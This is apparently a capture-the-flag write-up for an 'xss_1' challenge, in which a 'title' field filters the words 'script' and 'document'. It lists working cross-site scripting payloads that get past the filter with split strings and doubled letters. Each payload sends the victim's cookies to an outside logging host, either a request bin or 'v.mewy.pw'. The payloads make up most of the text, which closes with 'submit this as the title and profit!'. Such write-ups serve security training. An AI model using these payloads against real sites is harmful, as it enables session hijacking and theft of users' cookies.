# xss_1 - Injectable Title (no `script` or `document`, case insensitive)
- Create new trash and using `alert(1)` figure out what is injectable.
- Identify that the title field can be injected, so first create a request bin at https://requestbin.fullcontact.com/
- Construct payload avoiding filtered words to hit your request bin, `<img src=``[x](http://localhost:9000/page/x)` `onerror="new Image().src='http://v.mewy.pw:9447/18kxbln1/?qwer='+window['doc'+'ument'].cookie;">`
- Alternate payload below,`<sscriptcript>ddocumentocument.location="http://requestbin.fullcontact.com/1mwy90v1?c="+ddocumentocument.cookie;</sscriptcript>`
- Submit this as the title and profit!
![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528361061472_Screenshot+2018-06-07+01.29.24.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_D1CF04A7F2975FBE28B89C00E052CDE16A28AD0D6622A39C029738E493BE6857_1528361073465_Screenshot+2018-06-07+01.41.28.png)
